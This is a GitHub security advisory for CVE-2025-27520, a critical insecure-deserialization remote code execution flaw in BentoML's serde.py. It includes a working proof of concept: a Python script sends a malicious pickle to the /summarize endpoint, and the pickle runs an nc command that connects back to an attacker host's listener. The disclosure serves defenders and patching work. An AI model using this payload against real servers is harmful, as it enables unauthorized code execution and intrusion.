# BentoML Allows Remote Code Execution (RCE) via Insecure Deserialization

**GHSA**: GHSA-33xw-247w-6hmc | **CVE**: CVE-2025-27520 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-502

**Affected Packages**:
- **bentoml** (pip): >= 1.3.4, < 1.4.3

## Description

### Summary
A Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version(v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server.

### Details
It exists an unsafe code segment in `serde.py`: 
```Python
def deserialize_value(self, payload: Payload) -> t.Any:
    if "buffer-lengths" not in payload.metadata:
        return pickle.loads(b"".join(payload.data))
```
Through data flow analysis, it is confirmed that the `payload `content is sourced from an HTTP request, which can be fully manipulated by the attack. Due to the lack of validation in the code, maliciously crafted serialized data can execute harmful actions during deserialization.

### PoC
Environment:

- Server host:
  - IP: 10.98.36.123
  - OS: Ubuntu 
- Attack host:
  - IP: 10.98.36.121
  - OS: Ubuntu 



1. Follow the instructions on the BentoML official README(https://github.com/bentoml/BentoML) to set up the environment.

1.1 Install BentoML (Server host: 10.98.36.123) :
` pip install -U bentoml`

1.2 Define APIs in a `service.py` file (Server host: 10.98.36.123) :
``` Python
from __future__ import annotations

import bentoml

@bentoml.service(
    resources={"cpu": "4"}
)
class Summarization:
    def __init__(self) -> None:
        import torch
        from transformers import pipeline

        device = "cuda" if torch.cuda.is_available() else "cpu"
        self.pipeline = pipeline('summarization', device=device)

    @bentoml.api(batchable=True)
    def summarize(self, texts: list[str]) -> list[str]:
        results = self.pipeline(texts)
        return [item['summary_text'] for item in results]
```


1.3 Run the service code (Server host: 10.98.36.123) :
``` Bash
pip install torch transformers  # additional dependencies for local run

bentoml serve
```


2. Start nc listening on the attacking host (Attack host: 10.98.36.121) :
`nc -lvvp 1234`

3. Send maliciously crafted request (Attack host: 10.98.36.121) :
``` Python
import pickle
import os
import requests

headers = {'Content-Type': 'application/vnd.bentoml+pickle'}

class Evil:
    def __reduce__(self):
        return(os.system, ('nc 10.98.36.121 1234',))

payload = pickle.dumps(Evil())

requests.post("http://10.98.36.123:3000/summarize", data=payload, headers=headers)
```


4. Attack success (Attack host: 10.98.36.121) :
The server host(10.98.36.123) has connected to the attacker's host(10.98.36.121) listening on port 1234.
![nc](https://github.com/user-attachments/assets/858cba4a-6880-498f-b922-dd9a2dc78a85)



### Impact
Remote Code Execution (RCE).
